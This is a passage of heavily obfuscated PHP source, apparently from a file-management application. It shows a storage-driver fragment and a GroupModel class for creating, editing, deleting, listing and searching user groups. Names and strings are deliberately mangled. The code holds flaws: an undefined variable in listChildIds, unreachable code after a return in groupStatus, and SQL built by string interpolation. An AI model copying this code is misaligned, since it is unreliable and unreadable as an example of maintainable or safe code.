$¼§±¿¹) = $this->bucketManager->stat($this->bucket, $¢ÃÅ¦ô·); if ($Ìõ¿Š†î) { $Ìõ¿Š†î[$şìœüÇ¦[79]] = intval($Ìõ¿Š†î[$şìœüÇ¦[1527]]); } return $Ìõ¿Š†î; } protected function _isFolder($êû–âË”) { $İÜã•¶Ü =& $_SERVER[¢ñàß¿€]; if ($êû–âË” == $İÜã•¶Ü[12] || $êû–âË” == $İÜã•¶Ü[8]) { return !0; } list($Şå©úîİ, $’ØÚıØô) = $this->bucketManager->listFiles($this->bucket, trim($êû–âË”, $İÜã•¶Ü[8]) . $İÜã•¶Ü[8], $İÜã•¶Ü[12], 1, $İÜã•¶Ü[8]); return !empty($Şå©úîİ[$İÜã•¶Ü[1530]]) || !empty($Şå©úîİ[$İÜã•¶Ü[1531]]) ? !0 : !1; } } goto cÚœ•ÑŠ²Œ; BÊ“„›ù›î: class GroupModel extends ModelBase { protected $tableName = "\x67\x72\157\165\160"; protected $tableMeta = array("\164\141\142\x6c\145\116\x61\155\145" => "\147\x72\x6f\x75\x70\137\155\145\x74\x61", "\x6d\145\164\141\106\x69\x65\x6c\144" => "\x67\162\x6f\x75\x70\111\104"); protected function cacheFunctionAlias($ŒÌº¾Êı) { $¤ë·˜ˆ =& $_SERVER[¢ñàß¿€]; return array($¤ë·˜ˆ[2050] => array($ŒÌº¾Êı[0], $¤ë·˜ˆ[2051]), $¤ë·˜ˆ[2052] => array($ŒÌº¾Êı[0], $¤ë·˜ˆ[2053])); } protected function getInfo($ô¾½ÁŠ³, $±ìç¹áü = false) { $Ñú™ÑÒ = $this->getInfoSimple($ô¾½ÁŠ³); if (!$Ñú™ÑÒ) { return !1; } if ($±ìç¹áü) { return $this->_listDataApplyItem($Ñú™ÑÒ); } return $this->cacheFunctionGet($_SERVER[¢ñàß¿€][2054], $ô¾½ÁŠ³); } protected function getInfoSimple($¹å•ˆüä, $ˆÛş¾ü = false) { $è‰…Ò¦Ç =& $_SERVER[¢ñàß¿€]; if ($ˆÛş¾ü) { $·˜İ„£ù = array($è‰…Ò¦Ç[1968] => intval($¹å•ˆüä)); $œÏÇÄéÜ = $this->where($·˜İ„£ù)->find(); return is_array($œÏÇÄéÜ) ? $œÏÇÄéÜ : array(); } return $this->cacheFunctionGet($è‰…Ò¦Ç[2055], $¹å•ˆüä); } protected function groupAdd($Ò¨éœŞ) { $Õ²éÏ•™ =& $_SERVER[¢ñàß¿€]; if (!$Ò¨éœŞ[$Õ²éÏ•™[192]] && isset($Ò¨éœŞ[$Õ²éÏ•™[1968]]) && $Ò¨éœŞ[$Õ²éÏ•™[1968]] == 1) { if ($²«ëõ›ã = $this->getInfoSimple($Ò¨éœŞ[$Õ²éÏ•™[1968]], !0)) { return $Ò¨éœŞ[$Õ²éÏ•™[1968]]; } } else { $²«ëõ›ã = $this->getInfoSimple($Ò¨éœŞ[$Õ²éÏ•™[192]]); if (!$²«ëõ›ã) { return !1; } } $ìÇÍ®Ü = $Õ²éÏ•™[594]; if ($²«ëõ›ã[$Õ²éÏ•™[584]]) { $ìÇÍ®Ü = $²«ëõ›ã[$Õ²éÏ•™[584]] . $²«ëõ›ã[$Õ²éÏ•™[1968]] . $Õ²éÏ•™[50]; } $ÇïÍÁ¥§ = array($Õ²éÏ•™[494] => $this->groupNameAuto($Ò¨éœŞ[$Õ²éÏ•™[192]], $Ò¨éœŞ[$Õ²éÏ•™[32]]), $Õ²éÏ•™[477] => $Ò¨éœŞ[$Õ²éÏ•™[192]], $Õ²éÏ•™[652] => $ìÇÍ®Ü, $Õ²éÏ•™[2056] => $Ò¨éœŞ[$Õ²éÏ•™[1955]], $Õ²éÏ•™[2057] => 0, $Õ²éÏ•™[1972] => 0); if (isset($Ò¨éœŞ[$Õ²éÏ•™[1992]])) { $ÇïÍÁ¥§[$Õ²éÏ•™[1992]] = $Ò¨éœŞ[$Õ²éÏ•™[1992]]; } else { $ãï“’« = $this->max($Õ²éÏ•™[1992]); if (!$ãï“’«) { $ãï“’« = 0; } $ÇïÍÁ¥§[$Õ²éÏ•™[1992]] = $ãï“’« + 1; } if (!empty($Ò¨éœŞ[$Õ²éÏ•™[1968]])) { $ÇïÍÁ¥§[$Õ²éÏ•™[1968]] = $Ò¨éœŞ[$Õ²éÏ•™[1968]]; } $–Â½ˆ¯œ = $this->add($ÇïÍÁ¥§); $this->setNamePinyin($–Â½ˆ¯œ, $ÇïÍÁ¥§[$Õ²éÏ•™[32]]); if (isset($Ò¨éœŞ[$Õ²éÏ•™[2058]])) { $this->metaSet($–Â½ˆ¯œ, array($Õ²éÏ•™[2058] => $Ò¨éœŞ[$Õ²éÏ•™[2058]], $Õ²éÏ•™[2059] => $Ò¨éœŞ[$Õ²éÏ•™[2059]])); unset($Ò¨éœŞ[$Õ²éÏ•™[2058]]); unset($Ò¨éœŞ[$Õ²éÏ•™[2059]]); } Model($Õ²éÏ•™[1414])->groupRootAdd($–Â½ˆ¯œ); $this->_clearCache($Ò¨éœŞ[$Õ²éÏ•™[192]]); return $–Â½ˆ¯œ; } protected function groupEdit($ƒØ–ÕÔ¼, $ßÃ»¯˜) { $¨ÓáÓ´ =& $_SERVER[¢ñàß¿€]; $¯éËÃàı = $this->getInfoSimple($ƒØ–ÕÔ¼); if (!$¯éËÃàı) { return !1; } if (!empty($ßÃ»¯˜[$¨ÓáÓ´[192]])) { $Ë‰Âß©Å = $this->getInfoSimple($ßÃ»¯˜[$¨ÓáÓ´[192]]); if (!$Ë‰Âß©Å) { return !1; } if ($¯éËÃàı[$¨ÓáÓ´[1968]] == $Ë‰Âß©Å[$¨ÓáÓ´[1968]]) { return !1; } if ($ßÃ»¯˜[$¨ÓáÓ´[192]] != $¯éËÃàı[$¨ÓáÓ´[192]]) { if ($Ë‰Âß©Å[$¨ÓáÓ´[584]] !== $¯éËÃàı[$¨ÓáÓ´[584]] && strpos($Ë‰Âß©Å[$¨ÓáÓ´[584]], $¯éËÃàı[$¨ÓáÓ´[584]] . $¯éËÃàı[$¨ÓáÓ´[1968]] . $¨ÓáÓ´[50]) === 0) { return !1; } $ßÃ»¯˜[$¨ÓáÓ´[652]] = $Ë‰Âß©Å[$¨ÓáÓ´[584]] . $ßÃ»¯˜[$¨ÓáÓ´[192]] . $¨ÓáÓ´[50]; $this->_changeChildLevel($¯éËÃàı, $Ë‰Âß©Å); $this->_clearCache($Ë‰Âß©Å[$¨ÓáÓ´[1968]]); $this->_clearCache($¯éËÃàı[$¨ÓáÓ´[192]]); } } if (isset($ßÃ»¯˜[$¨ÓáÓ´[32]])) { $this->setNamePinyin($ƒØ–ÕÔ¼, $ßÃ»¯˜[$¨ÓáÓ´[32]]); } if (isset($ßÃ»¯˜[$¨ÓáÓ´[2058]])) { $this->metaSet($ƒØ–ÕÔ¼, array($¨ÓáÓ´[2058] => $ßÃ»¯˜[$¨ÓáÓ´[2058]], $¨ÓáÓ´[2059] => $ßÃ»¯˜[$¨ÓáÓ´[2059]])); unset($ßÃ»¯˜[$¨ÓáÓ´[2058]]); unset($ßÃ»¯˜[$¨ÓáÓ´[2059]]); } $this->_clearChildrenCache($¯éËÃàı); return $this->where(array($¨ÓáÓ´[2060] => $ƒØ–ÕÔ¼))->save($ßÃ»¯˜); } private function _clearChildrenCache($°“œİòÅ) { $·Ñ«á¨ú =& $_SERVER[¢ñàß¿€]; $“¢Ù‚Ãõ = array($·Ñ«á¨ú[652] => array($·Ñ«á¨ú[612], $°“œİòÅ[$·Ñ«á¨ú[584]] . $°“œİòÅ[$·Ñ«á¨ú[1968]] . $·Ñ«á¨ú[613])); $è·åÜ†‰ = $this->field($·Ñ«á¨ú[1968])->where($“¢Ù‚Ãõ)->select(); foreach ($è·åÜ†‰ as $”ú›¨³ã) { $this->_clearCache($”ú›¨³ã[$·Ñ«á¨ú[1968]]); } } private function _clearCache($å†Ìü”¯) { $±áâùĞĞ =& $_SERVER[¢ñàß¿€]; $this->cacheFunctionClear($±áâùĞĞ[2054], $å†Ìü”¯); $this->cacheFunctionClear($±áâùĞĞ[2055], $å†Ìü”¯); } private function _changeChildLevel($óĞÇËü¼, $ÛÑ®šÅÌ, $œÚÔì‹Â = false) { $şÜåŒî =& $_SERVER[¢ñàß¿€]; $Îñê©ıÍ = $óĞÇËü¼[$şÜåŒî[584]] . $óĞÇËü¼[$şÜåŒî[1968]] . $şÜåŒî[50]; $ÁÆé¸Ùß = $ÛÑ®šÅÌ[$şÜåŒî[584]] . $ÛÑ®šÅÌ[$şÜåŒî[1968]] . $şÜåŒî[50] . $óĞÇËü¼[$şÜåŒî[1968]] . $şÜåŒî[50]; if ($œÚÔì‹Â) { $ÁÆé¸Ùß = $ÛÑ®šÅÌ[$şÜåŒî[584]] . $ÛÑ®šÅÌ[$şÜåŒî[1968]] . $şÜåŒî[50]; } $öÃÙ¤® = array($şÜåŒî[652] => array($şÜåŒî[612], $óĞÇËü¼[$şÜåŒî[584]] . $óĞÇËü¼[$şÜåŒî[1968]] . $şÜåŒî[613])); $°é»×šï = array($şÜåŒî[652] => array($şÜåŒî[661], "\x72\145\160\x6c\141\143\145\50\x70\141\162\145\x6e\x74\x4c\145\166\x65\x6c\x2c\47{$Îñê©ıÍ}\47\54\x27{$ÁÆé¸Ùß}\47\51")); $this->_clearChildrenCache($óĞÇËü¼); $this->where($öÃÙ¤®)->data($°é»×šï)->save(); } public function setNamePinyin($Ê­şİƒŸ, $±—¶öĞ = false) { $ô£•€™­ =& $_SERVER[¢ñàß¿€]; if (!$±—¶öĞ) { $¾è©¿½Å = $this->getInfoSimple($Ê­şİƒŸ); $±—¶öĞ = $¾è©¿½Å[$ô£•€™­[32]]; } if (!Input::check($±—¶öĞ, $ô£•€™­[655])) { $this->metaSet($Ê­şİƒŸ, $ô£•€™­[538], null); $this->metaSet($Ê­şİƒŸ, $ô£•€™­[537], null); return; } $ˆÓ“¿—Ë = array($ô£•€™­[538] => str_replace($ô£•€™­[53], $ô£•€™­[12], Pinyin::get($±—¶öĞ)), $ô£•€™­[537] => Pinyin::get($±—¶öĞ, $ô£•€™­[656])); $this->metaSet($Ê­şİƒŸ, $ˆÓ“¿—Ë); } protected function groupStatus($Õå„á, $ö»ı÷–±) { $ºËÙàöç =& $_SERVER[¢ñàß¿€]; $ç€Øú×¸ = $this->getInfoSimple($Õå„á); if (!$ç€Øú×¸) { return !1; } $this->_clearCache($Õå„á); return $this->metaSet($Õå„á, $ºËÙàöç[821], $ö»ı÷–±); if ($ö»ı÷–± == $ºËÙàöç[91]) { $¯ÚÎ„Ü = $this->parentLevelArray($ç€Øú×¸[$ºËÙàöç[584]]); } else { } $¯ÚÎ„Ü[] = $ç€Øú×¸[$ºËÙàöç[1968]]; $ãİ˜ÚøÜ = array(); foreach ($¯ÚÎ„Ü as $Õå„á) { $ãİ˜ÚøÜ[] = array($ºËÙàöç[1968] => $Õå„á, $ºËÙàöç[97] => $ºËÙàöç[821], $ºËÙàöç[450] => $ö»ı÷–±); $this->_clearCache($Õå„á); } return Model($ºËÙàöç[2061])->addAll($ãİ˜ÚøÜ, array(), !0); } protected function groupRemove($¼·–¨ˆü, $³ëÂ¬†ô = false) { $ÁöóóÜß =& $_SERVER[¢ñàß¿€]; $ì…Äïà¸ = array($ÁöóóÜß[1968] => $¼·–¨ˆü); $®¿ÙÍÈŒ = $this->where($ì…Äïà¸)->find(); if (!$®¿ÙÍÈŒ || $®¿ÙÍÈŒ[$ÁöóóÜß[192]] == 0) { return !1; } if (!$³ëÂ¬†ô) { $ àâõò¸ = $this->getInfoSimple($®¿ÙÍÈŒ[$ÁöóóÜß[192]]); $this->_changeChildLevel($®¿ÙÍÈŒ, $ àâõò¸, !0); $this->where(array($ÁöóóÜß[192] => $¼·–¨ˆü))->save(array($ÁöóóÜß[192] => $®¿ÙÍÈŒ[$ÁöóóÜß[192]])); $this->_clearCache($ àâõò¸[$ÁöóóÜß[1968]]); } Model($ÁöóóÜß[2061])->where($ì…Äïà¸)->delete(); Model($ÁöóóÜß[2062])->where($ì…Äïà¸)->delete(); Model($ÁöóóÜß[895])->groupRootRemove($¼·–¨ˆü); $this->_clearCache($®¿ÙÍÈŒ[$ÁöóóÜß[192]]); return $this->where($ì…Äïà¸)->delete(); } protected function groupSort($ŸæÀÆù–) { $†­ü´ò÷ =& $_SERVER[¢ñàß¿€]; $æß’ì¢´ = array(); foreach ($ŸæÀÆù– as $õ–ÁÜ¬ => $Ó£—Şç) { $æß’ì¢´[] = array($†­ü´ò÷[1968], $Ó£—Şç, $†­ü´ò÷[1992], $õ–ÁÜ¬ + 1); } $this->saveAll($æß’ì¢´); } public function listData() { $¸•ª¬ = $this->_makeOrder()->selectPage(50); $this->_listDataApply($¸•ª¬[$_SERVER[¢ñàß¿€][445]]); return $¸•ª¬; } private function _makeOrder($÷»ğï†¬ = '') { $´øûˆÌÇ =& $_SERVER[¢ñàß¿€]; $æ„Èé¸ş = array($´øûˆÌÇ[1968], $´øûˆÌÇ[32], $´øûˆÌÇ[1957], $´øûˆÌÇ[231]); $çò‚–Üã = array($´øûˆÌÇ[523] => $´øûˆÌÇ[524], $´øûˆÌÇ[525] => $´øûˆÌÇ[526]); $Ë×êû = Input::get($´øûˆÌÇ[530], $´øûˆÌÇ[7], $´øûˆÌÇ[1972], $æ„Èé¸ş); $ìşı¦° = Input::get($´øûˆÌÇ[531], $´øûˆÌÇ[7], $´øûˆÌÇ[2063], array($´øûˆÌÇ[2063], $´øûˆÌÇ[525])); $ìşı¦° = $çò‚–Üã[$ìşı¦°]; $÷»ğï†¬ = $÷»ğï†¬ . "{$Ë×êû}\40{$ìşı¦°}\54\40\x67\x72\x6f\x75\x70\x49\104\x20\x61\163\143"; return $this->order($÷»ğï†¬); } public function listChild($¸ÁÎà§É) { $ŸûË¤ å =& $_SERVER[¢ñàß¿€]; $ùåÒÏ… = $this->where(array($ŸûË¤ å[192] => $¸ÁÎà§É))->_makeOrder()->selectPage(200); $this->_listDataApply($ùåÒÏ…[$ŸûË¤ å[445]]); return $ùåÒÏ…; } public function listChildIds($¯±è¿ôå) { $®–¼ °Ñ =& $_SERVER[¢ñàß¿€]; if (is_string($ÁÍÄ¢Š¬)) { $¯±è¿ôå = explode($®–¼ °Ñ[50], $¯±è¿ôå); } $õ€ùÌ = $this->where(array($®–¼ °Ñ[1968] => array($®–¼ °Ñ[7], $¯±è¿ôå)))->field($®–¼ °Ñ[2064])->select(); if (!$õ€ùÌ) { return !1; } $ªÆ‘ ëÚ = array(); foreach ($õ€ùÌ as $üÑä¯„Á) { $ªÆ‘ ëÚ[] = "\163\x65\154\x65\143\x74\x20\147\x72\x6f\165\x70\x49\104\40\146\x72\157\x6d\x20\140\147\162\157\x75\x70\140\40\x77\150\x65\x72\145\40\x70\x61\162\145\156\164\x4c\145\166\145\154\x20\154\151\153\145\x20\x27{$üÑä¯„Á[$®–¼ °Ñ[584]]}{$üÑä¯„Á[$®–¼ °Ñ[1968]]}\54\x25\47"; } $ªÆ‘ ëÚ = implode($®–¼ °Ñ[2065], $ªÆ‘ ëÚ); $õ€ùÌ = $this->query($ªÆ‘ ëÚ); if (!$õ€ùÌ) { return array(); } $¯±è¿ôå = array_to_keyvalue($õ€ùÌ, $®–¼ °Ñ[12], $®–¼ °Ñ[1968]); return array_unique($¯±è¿ôå); } public function listByID($€Ìï¤Üö) { $ú˜œÌĞŠ =& $_SERVER[¢ñàß¿€]; if (!$€Ìï¤Üö) { return array(); } $Ê»­Ğ¢ = array($ú˜œÌĞŠ[1968] => array($ú˜œÌĞŠ[7], $€Ìï¤Üö)); $¼ÕÖ˜× = $this->where($Ê»­Ğ¢)->select(); $¼ÕÖ˜× = array_sort_keep($¼ÕÖ˜×, $ú˜œÌĞŠ[1968], $€Ìï¤Üö); $this->_listDataApply($¼ÕÖ˜×); return $¼ÕÖ˜×; } public function listSearch($ıªˆú£È) { $ãºµÚğ =& $_SERVER[¢ñàß¿€]; $½“òŸ€ = trim($ıªˆú£È[$ãºµÚğ[2066]]); $»¬å‚Ÿ¤ = explode($ãºµÚğ[53], $½“òŸ€); if (!$½“òŸ€ || count($»¬å‚Ÿ¤) == 1) { return $this->listSearchNow($ıªˆú£È); } $çóáÏÚ£ = array($ãºµÚğ[445] => array()); foreach ($»¬å‚Ÿ¤ as $½¢‘Íæ») { if (!trim($½¢‘Íæ»)) { continue; } $ıªˆú£È[$ãºµÚğ[2066]] = $½¢‘Íæ»; $¼œª£ · = $this->listSearchNow($ıªˆú£È); $çóáÏÚ£[$ãºµÚğ[445]] = array_merge($çóáÏÚ£[$ãºµÚğ[445]], $¼œª£ ·[$ãºµÚğ[445]]); } $çóáÏÚ£[$ãºµÚğ[445]] = array_unique_by_key($çóáÏÚ£[$ãºµÚğ[445]], $ãºµÚğ[1968]); $çóáÏÚ£[$ãºµÚğ[442]] = array($ãºµÚğ[443] => count($çóáÏÚ£[$ãºµÚğ[445]]), $ãºµÚğ[439] => 20, $ãºµÚğ[429] => 1, $ãºµÚğ[444] => 1); return $çóáÏÚ£; } public function listSearchNow($›—úÒĞÃ) { $½Ï†ûø¡ =& $_SERVER[¢ñàß¿€]; $İå”²æÌ = trim($›—úÒĞÃ[$½Ï†ûø¡[2066]]); $½ŞïÀ‘Ö = isset($›—úÒĞÃ[$½Ï†ûø¡[2067]]) ? $›—úÒĞÃ[$½Ï†ûø¡[2067]] : !1; if (!trim($İå”²æÌ)) { return !1; } $İå”²æÌ = str_replace($½Ï†ûø¡[2068], $½Ï†ûø¡[2069], $İå”²æÌ); $—‹¿¯  = array($½Ï†ûø¡[1968] => array($½Ï†ûø¡[459], "{$İå”²æÌ}\x25"), $½Ï†ûø¡[32] => array($½Ï†ûø¡[459], "\x25{$İå”²æÌ}\45"), $½Ï†ûø¡[1075] => $½Ï†ûø¡[2070]); if ($½ŞïÀ‘Ö) { $ôé´©çŸ = $this->getInfoSimple($½ŞïÀ‘Ö); $Ÿš‡øïÕ = $ôé´©çŸ[$½Ï†ûø¡[584]] . $½ŞïÀ‘Ö . $½Ï†ûø¡[613]; $—‹¿¯  = array($—‹¿¯ , array($½Ï†ûø¡[584] => array($½Ï†ûø¡[459], $Ÿš‡øïÕ))); } $—‹¿¯  = $this->parseWhereLike($—‹¿¯ ); $Îáü­ÚŞ = $this->_makeOrder()->where($—‹¿¯ )->selectPage(20); $Îáü­ÚŞ = $Îáü­ÚŞ ? $Îáü­ÚŞ : array($½Ï†ûø¡[445] => array(), $½Ï†ûø¡[442] => array()); if (!$Îáü­ÚŞ || count($Îáü­ÚŞ[$½Ï†ûø¡[445]]) < 5 && Input::check($İå”²æÌ, $½Ï†ûø¡[394])) { $îîü‰³ = $this->groupChildrenAll($½ŞïÀ‘Ö); $¹Õø»ÒÄ = $this->_searchFromMeta($½Ï†ûø¡[537], $İå”²æÌ, 10, $îîü‰³); $À¼®…òà = $this->_searchFromMeta($½Ï†ûø¡[538], $İå”²æÌ, 10, $îîü‰³); $ìĞœë×Â = array_merge($¹Õø»ÒÄ, $À¼®…òà, $Îáü­ÚŞ[$½Ï†ûø¡[445]]); $Îáü­ÚŞ[$½Ï†ûø¡[445]] = array_unique_by_key($ìĞœë×Â, $½Ï†ûø¡[1968]); $Îáü­ÚŞ[$½Ï†ûø¡[442]][$½Ï†ûø¡[443]] = count($Îáü­ÚŞ[$½Ï†ûø¡[445]]); $Îáü­ÚŞ[$½Ï†ûø¡[442]][$½Ï†ûø¡[444]] = ceil($Îáü­ÚŞ[$½Ï†ûø¡[442]][$½Ï†ûø¡[443]] / $Îáü­ÚŞ[$½Ï†ûø¡[442]][$½Ï†ûø¡[439]]); } $this->_listDataApply($Îáü­ÚŞ[$½Ï†ûø¡[445]]); return $Îáü­ÚŞ; } protected function groupChildrenAll($Ù«Üğ²à) { $¤¢Ì¼šÂ =& $_SERVER[¢ñàß¿€]; if (!$Ù«Üğ²à) { return !1; } if (!is_array($Ù«Üğ²à)) { $Ù«Üğ²à = array($Ù«Üğ²à); } $€ÅéèÍ” = $Ù«Üğ²à; foreach ($Ù«Üğ²à as $¥â°¯»˜) { $¥£î®ı× = $this->getInfoSimple($¥â°¯»˜); $Ï¼İÏÁ = array($¤¢Ì¼šÂ[584] => array($¤¢Ì¼šÂ[459], $¥£î®ı×[$¤¢Ì¼šÂ[584]] . $¥â°¯»˜ . $¤¢Ì¼šÂ[613])); $“¥”–ˆé = $this->field($¤¢Ì¼šÂ[1968])->where($Ï¼İÏÁ)->select(); $€ÅéèÍ” = array_merge($€ÅéèÍ”, array_to_keyvalue($“¥”–ˆé, $¤¢Ì¼šÂ[12], $¤¢Ì¼šÂ[1968])); } return array_unique($€ÅéèÍ”); } private function _searchFromMeta($¸ ù×Ïİ, $°¢ìÎêû, $‘á¯ã, $µæóú–) { $ÎÌõÖÅé =& $_SERVER[¢ñàß¿€]; $°¢ìÎêû = strtolower($°¢ìÎêû); $â‡ÇŠŠ˜ = array($ÎÌõÖÅé[97] => $¸ ù×Ïİ, $ÎÌõÖÅé[450] => array($ÎÌõÖÅé[459], "\x25{$°¢ìÎêû}\45")); $â‡ÇŠŠ˜ = $this->parseWhereLike($â‡ÇŠŠ˜); if ($µæóú–) { $â‡ÇŠŠ˜[$ÎÌõÖÅé[1968]] = array($ÎÌõÖÅé[7], $µæóú–); } $ñ«â¡˜ı = Model($ÎÌõÖÅé[2071])->where($â‡ÇŠŠ˜)->limit($‘á¯ã)->select(); if (!$ñ«â¡˜ı) { return array(); } $ñ«â¡˜ı = array_to_keyvalue($ñ«â¡˜ı, $ÎÌõÖÅé[12], $ÎÌõÖÅé[1968]); $¤Î«İ’½ = $this->where(array($ÎÌõÖÅé[2060] => array($ÎÌõÖÅé[7], $ñ«â¡˜ı)))->select(); if (!$¤Î«İ’½) { return array(); } return $¤Î«İ’½; } protected function _listDataApplyItem($ÄìĞû“É) { $«‘æÈ•ö = array($ÄìĞû“É); $this->_listDataApply($«‘æÈ•ö); return $«‘æÈ•ö[0]; } protected function _listDataApply(&$ä‘‘Úå) { $£«ïï±û =& $_SERVER[¢ñàß¿€]; if (!$ä‘‘Úå) { return; } $£àê¼…• = array_to_keyvalue($ä‘‘Úå, $£«ïï±û[12], $£«ïï±û[1968]); $this->_listAppendChildren($ä‘‘Úå); $this->_listAppendChildrenMember($ä‘‘Úå); $this->_listAppendMeta($ä‘‘Úå, $£àê¼…•); $this->_listAppendParent($ä‘‘Úå); $this->_listAppendSourceRoot($ä‘‘Úå, $£àê¼…•); } private function _listAppendChildren(&$¨Å—â¯Ø) { $ÆÉ˜›‰ =& $_SERVER[¢ñàß¿€]; $±å±˜¥‡ = array_to_keyvalue($¨Å—â¯Ø, $ÆÉ˜›‰[12], $ÆÉ˜›‰[1968]); $ä¾áÓĞ’ = array($ÆÉ˜›‰[192] => array($ÆÉ˜›‰[7], $±å±˜¥‡)); $‚¥é˜µÀ = array($ÆÉ˜›‰[192], $ÆÉ˜›‰[2072] => $ÆÉ˜›‰[565]); $ı»–­–¶ = $this->field($‚¥é˜µÀ)->where($ä¾áÓĞ’)->group($ÆÉ˜›‰[192])->select(); $åŠäÏú¥ = array_to_keyvalue($ı»–­–¶, $ÆÉ˜›‰[192], $ÆÉ˜›‰[565]); foreach ($¨Å—â¯Ø as &$†…·Ø¶) { $¨Êã·« = $†…·Ø¶[$ÆÉ˜›‰[1968]]; $†…·Ø¶[$ÆÉ˜›‰[2073]] = isset($åŠäÏú¥[$¨Êã·«]) ? intval($åŠäÏú¥[$¨Êã·«]) : !1; } unset($†…·Ø¶); } private function _listAppendChildrenMember(&$ÉÖßˆ†Á) { $ÉãÒ¶“Ô =& $_SERVER[¢ñàß¿€]; $ß»»é¨Ÿ = array_to_keyvalue($ÉÖßˆ†Á, $ÉãÒ¶“Ô[12], $ÉãÒ¶“Ô[1968]); $Œ“»‡Š = array($ÉãÒ¶“Ô[1968] => array($ÉãÒ¶“Ô[7], $ß»»é¨Ÿ)); $ğ°÷“Šş = array($ÉãÒ¶“Ô[1968], $ÉãÒ¶“Ô[2072] => $ÉãÒ¶“Ô[565]); $åÚß—³ = Model($ÉãÒ¶“Ô[2062])->field($ğ°÷“Šş)->where($Œ“»‡Š)->group($ÉãÒ¶“Ô[1968])->select(); $·¥Å¯š = array_to_keyvalue($åÚß—³, $ÉãÒ¶“Ô[1968], $ÉãÒ¶“Ô[565]); foreach ($ÉÖßˆ†Á as &$ó‰ŠÕØ‡) { $á¦ÓÀ© = $ó‰ŠÕØ‡[$ÉãÒ¶“Ô[1968]]; $ó‰ŠÕØ‡[$ÉãÒ¶“Ô[2074]] = isset($·¥Å¯š[$á¦ÓÀ©]) ? intval($·¥Å¯š[$á¦ÓÀ©]) : !1; } unset($ó‰ŠÕØ‡); } private function _listAppendMeta(&$ıÜÎÊİß, $ÙËÒ®ŠË) { $Ï‰ÁûÇ´ =& $_SERVER[¢ñàß¿€]; $·è ¶ö  = array($Ï‰ÁûÇ´[1968] => array($Ï‰ÁûÇ´[7], $ÙËÒ®ŠË)); $»Ğ›È†ò = Model($Ï‰ÁûÇ´[2061])->where($·è ¶ö )->select(); $»Ğ›È†ò = array_to_keyvalue_group($»Ğ›È†ò, $Ï‰ÁûÇ´[1968]); foreach ($»Ğ›È†ò as &$š•í•¸ç) { $š•í•¸ç = array_to_keyvalue($š•í•¸ç, $Ï‰ÁûÇ´[97], $Ï‰ÁûÇ´[450]); } unset($š•í•¸ç); foreach ($ıÜÎÊİß as &$–Á®Ù½¬) { $–Á®Ù½¬[$Ï‰ÁûÇ´[539]] = array(); if (isset($»Ğ›È†ò[$–Á®Ù½¬[$Ï‰ÁûÇ´[1968]]])) { $–Á®Ù½¬[$Ï‰ÁûÇ´[539]] = $»Ğ›È†ò[$–Á®Ù½¬[$Ï‰ÁûÇ´[1968]]]; } } unset($–Á®Ù½¬); } protected function parentLevelArray($Ö‰İ¨èç) { $ëıâˆ«ø =& $_SERVER[¢ñàß¿€]; $Ö‰İ¨èç = explode($ëıâˆ«ø[50], trim($Ö‰İ¨èç, $ëıâˆ«ø[50])); $Ö‰İ¨èç = array_remove_value($Ö‰İ¨èç, $ëıâˆ«ø[228]); return $Ö‰İ¨èç; } protected function parentInGroup($²¯Şæ•õ, $—¿Œå) { $ïşºñÅƒ =& $_SERVER[¢ñàß¿€]; $†£‘ÆÅ = $this->getInfoSimple($²¯Şæ•õ); if (!$†£‘ÆÅ) { return !0; } $Ô¶éĞñå = $this->parentLevelArray($†£‘ÆÅ[$ïşºñÅƒ[584]]); $Ô¶éĞñå[] = $²¯Şæ•õ; foreach ($Ô¶éĞñå as $²¯Şæ•õ) { if (in_array($²¯Şæ•õ . $ïşºñÅƒ[12], $—¿Œå)) { return !0; } } return !1; } private function _listAppendParent(&$‡ØÕ¹×) { $ó´““ßñ =& $_SERVER[¢ñàß¿€]; $áÈ…èÙ = array(); foreach ($‡ØÕ¹× as &$÷¡ñİ´é) { $áÈ…èÙ[$÷¡ñİ´é[$ó´““ßñ[1968]]] = $÷¡ñİ´é[$ó´““ßñ[32]]; $²¦×©»æ = $this->parentLevelArray($÷¡ñİ´é[$ó´““ßñ[584]]); foreach ($²¦×©»æ as $ØúáÛŠÃ) { if (!isset($áÈ…èÙ[$ØúáÛŠÃ])) { $áÈ…èÙ[$ØúáÛŠÃ] = 0; } } } unset($÷¡ñİ´é); foreach ($áÈ…èÙ as $ó•Ãí¨Õ => $ì¿ù½­) { if ($ì¿ù½­) { continue; } $°”„Í¼† = $this->getInfoSimple($ó•Ãí¨Õ); $áÈ…èÙ[$ó•Ãí¨Õ] = $°”„Í¼†[$ó´““ßñ[32]]; } $¶¿çõø = $GLOBALS[$ó´““ßñ[6]][$ó´““ßñ[92]][$ó´““ßñ[2075]]; if (KodUser::isRoot()) { $¶¿çõø = !1; } foreach ($‡ØÕ¹× as &$÷¡ñİ´é) { $²¦×©»æ = $this->parentLevelArray($÷¡ñİ´é[$ó´““ßñ[584]]); $óèÂÄÂÆ = $ó´““ßñ[12]; foreach ($²¦×©»æ as $ó•Ãí¨Õ => $ØúáÛŠÃ) { if ($¶¿çõø && $ó•Ãí¨Õ == 0) { continue; } $óèÂÄÂÆ .= $áÈ…èÙ[$ØúáÛŠÃ] . $ó´““ßñ[8]; } if ($²¦×©»æ) { $óèÂÄÂÆ .= $÷¡ñİ´é[$ó´““ßñ[32]]; } $÷¡ñİ´é[$ó´““ßñ[589]] = str_replace($ó´““ßñ[592], $ó´““ßñ[8], $óèÂÄÂÆ); } unset($÷¡ñİ´é); } private function _listAppendSourceRoot(&$¨ı£¿é», $¸Ù…ÒÙæ) { $À¹¹’­Š =& $_SERVER[¢ñàß¿€]; $¿üùªø = Model($À¹¹’­Š[895])->listSourceRoot(SourceModel::TYPE_GROUP, $¸Ù…ÒÙæ); $¿üùªø = array_to_keyvalue($¿üùªø, $À¹¹’­Š[569]); $¿üùªø = array_remove_key($¿üùªø, $À¹¹’­Š[569]); foreach ($¨ı£¿é» as &$º­™ã˜) { $º­™ã˜[$À¹¹’­Š[90]] = $¿üùªø[$º­™ã˜[$À¹¹’­Š[1968]]] ? $¿üùªø[$º­™ã˜[$À¹¹’­Š[1968]]] : array(); } unset($º­™ã˜); } protected function groupMerge($øãİÚş) { $øãİÚş = array_values(array_unique($øãİÚş)); $ÌÂı”Óô = array(); for ($Í¾Ô¾™ã = 0; $Í¾Ô¾™ã < count($øãİÚş); $Í¾Ô¾™ã++) { $°€‹£´ = !1; for ($Ùµı’³ = 0; $Ùµı’³ < count($øãİÚş); $Ùµı’³++) { if ($Í¾Ô¾™ã == $Ùµı’³) { continue; } if ($this->isParentOf($øãİÚş[$Ùµı’³], $øãİÚş[$Í¾Ô¾™ã])) { $°€‹£´ = !0; break; } } if 